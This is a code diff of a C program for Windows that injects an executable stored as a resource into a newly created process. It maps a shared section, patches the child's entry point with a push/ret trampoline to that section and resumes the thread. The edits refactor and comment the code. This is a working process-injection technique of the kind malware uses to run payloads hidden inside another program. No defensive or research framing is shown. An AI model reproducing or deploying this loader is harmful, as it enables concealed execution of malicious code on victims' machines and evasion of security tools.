@@ -12,8 +12,9 @@ int main()
 	DWORD oldProtection = NULL;
 	LPVOID lpHeaderBuffer[2048];
 
-	const int baseAddrLength = 4;
-	const int pebImageBaseAddrOffset = 8;
+	const unsigned int pebSize = sizeof(PEB);
+	const unsigned int baseAddrLength = 4;
+	const unsigned int pebImageBaseAddrOffset = 8;
 
 	ZeroMemory(&si, sizeof(si));
 	si.cb = sizeof(si);
@@ -64,16 +65,13 @@ int main()
 	HANDLE secHandle = NULL;
 
 	LARGE_INTEGER pLargeInt;
-	
-
 	pLargeInt.QuadPart = pNTHeaderResource->OptionalHeader.SizeOfImage;
 
-	LPDWORD lpFileSizeHigh = NULL;
+	/* Retrieve the size of the exe that is to be injected */
 	SIZE_T commitSize = SizeofResource(NULL, resc);
-	SIZE_T viewSizeCurrentProcess = 0;
+
 	SIZE_T viewSizeCreatedPrcess = 0;
 
-	PVOID sectionBaseAddressCurrentProcess = NULL;
 	PVOID sectionBaseAddressCreatedProcess = NULL;
 
 	/* Create the section object which will be shared by both the current and created process */
@@ -96,8 +94,9 @@ int main()
 
 	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNTHeaderResource);
 
-	/* Retrieve the memory associated with the */
-	ReadProcessMemory(pi.hProcess, pPeb->ImageBaseAddress, lpHeaderBuffer, 2048, NULL);
+
+	/* Retrieve the PEB associated with the created process */
+	ReadProcessMemory(pi.hProcess, pPeb->ImageBaseAddress, lpHeaderBuffer, pebSize, NULL);
 
 	PIMAGE_DOS_HEADER pDosHeaderCreatedProcess = (PIMAGE_DOS_HEADER)(LPVOID)lpHeaderBuffer;
 
@@ -108,6 +107,12 @@ int main()
 
 	PIMAGE_NT_HEADERS pNTHeaderCreatedProcess = (PIMAGE_NT_HEADERS)((DWORD)pDosHeaderCreatedProcess + (DWORD)pDosHeaderCreatedProcess->e_lfanew);
 
+	/*
+		0x68       PUSH DWORD
+		0x00000000 <MAPPED SECTION BASE ADDRESS>
+		0xc3       RET
+	
+	*/
 	BYTE opCodeBuffer[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
 
 	VirtualProtectEx(
@@ -118,9 +123,8 @@ int main()
 		&oldProtection
 	);
 
-	DWORD resourceOEP = (DWORD)sectionBaseAddressCreatedProcess;
-
-	memcpy(opCodeBuffer + 1, &resourceOEP, 4);
+	/* Copy the section base address into the buffer containing the opcode*/
+	memcpy(opCodeBuffer + 1, &sectionBaseAddressCreatedProcess, 4);
 
 	WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pPeb->ImageBaseAddress + (DWORD)pNTHeaderCreatedProcess->OptionalHeader.AddressOfEntryPoint), opCodeBuffer, sizeof(opCodeBuffer), NULL);
 
@@ -139,7 +143,6 @@ int main()
 
 	/* Resume the created processes main thread with the updated OEP */
 	ResumeThread(pi.hThread);
-
 
 
 	return 0;
